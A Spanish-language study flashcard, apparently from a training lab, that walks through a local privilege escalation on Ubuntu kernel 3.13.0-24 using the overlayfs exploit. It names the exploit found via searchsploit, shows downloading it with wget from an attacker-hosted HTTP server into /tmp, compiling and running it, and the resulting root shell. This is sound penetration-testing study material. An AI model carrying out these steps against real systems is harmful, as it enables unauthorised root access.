**Flashcard: Escalada de privilegios en Ubuntu 3.13.0-24 usando exploit overlayfs**

---

**Objetivo:** Obtener privilegios root desde usuario limitado (`karen`) en Ubuntu 14.04 con kernel `3.13.0-24-generic`.

---

**1. Identificación del sistema y kernel**

* Comando:

```bash
uname -a
```

* Resultado:

```
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 GNU/Linux
```

* Nota: Kernel antiguo, vulnerable a exploits locales conocidos como `overlayfs`.

---

**2. Búsqueda del exploit adecuado**

* Herramienta: `searchsploit`
* Comando:

```bash
searchsploit ubuntu 3.13
```

* Exploit seleccionado:

```
linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 - 'overlayfs' Local Privilege Escalation
```

---

**3. Preparación del servidor atacante para transferir el exploit**

* Comando en máquina atacante:

```bash
python3 -m http.server 8000
```

* Confirmar IP de la interfaz VPN:

```bash
ip a
```

* Ejemplo IP: `10.6.23.167`

---

**4. Transferencia del exploit a la víctima**

* Directorio escribible recomendado: `/tmp`
* Comando en víctima:

```bash
wget http://10.6.23.167:8000/exploit.c -O /tmp/exploit.c
cd /tmp
```

---

**5. Compilación del exploit**

* Comando:

```bash
gcc exploit.c -o exploit
```

* Resultado: genera binario ejecutable `exploit` en `/tmp`.

---

**6. Ejecución del exploit**

* Comando:

```bash
./exploit
```

* Indicadores de ejecución:

```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
```

---

**7. Verificación de privilegios**

* Comando:

```bash
id
```

* Resultado esperado:

```
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```

* Conclusión: Privilegios root obtenidos, explotación exitosa.

---

**Notas finales:**

* Exploit: `overlayfs` permite crear `/etc/ld.so.preload` y cargar librerías maliciosas para elevar privilegios.
* Directorio `/tmp` usado por permisos de escritura de usuario.
* Kernel vulnerable: `3.13.0-24-generic`.

---
